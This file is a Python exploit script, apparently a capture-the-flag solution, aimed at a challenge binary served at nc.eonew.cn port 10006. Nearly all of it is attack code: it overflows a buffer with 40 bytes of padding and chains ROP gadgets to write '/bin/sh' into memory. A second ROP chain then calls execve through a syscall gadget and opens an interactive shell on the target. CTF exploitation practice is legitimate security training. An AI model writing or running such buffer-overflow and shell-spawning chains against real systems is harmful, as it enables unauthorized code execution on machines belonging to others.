#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall')

host = args.HOST or 'nc.eonew.cn'
port = int(args.PORT or 10006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

libc=False
io = start()
r=Rootkit(io)
syscall = 0x000000004007a3

re()
sl(b"-1")
re()
rop1 = b"A"*40 +  gadget("pop rax; ret") + p64(0x0) + gadget("pop rdi; ret") + p64(0x0) +  gadget("pop rsi; pop r15; ret;") + p64(0x601700) + p64(0x0) + p64(syscall) + p64(0x0) + p64(exe.sym.main)
s(rop1)
pause()
s(b"/bin/sh\x00")
re()
sl(b"-1")
re()
rop2 = b"A"*40 +  gadget("pop rax; ret") + p64(0x3b) + gadget("pop rdi; ret") + p64(0x601700) +  gadget("pop rsi; pop r15; ret;") + p64(0x0) + p64(0x0) + gadget("pop rdx; ret") + p64(0x0) + p64(syscall)
s(rop2)
io.interactive()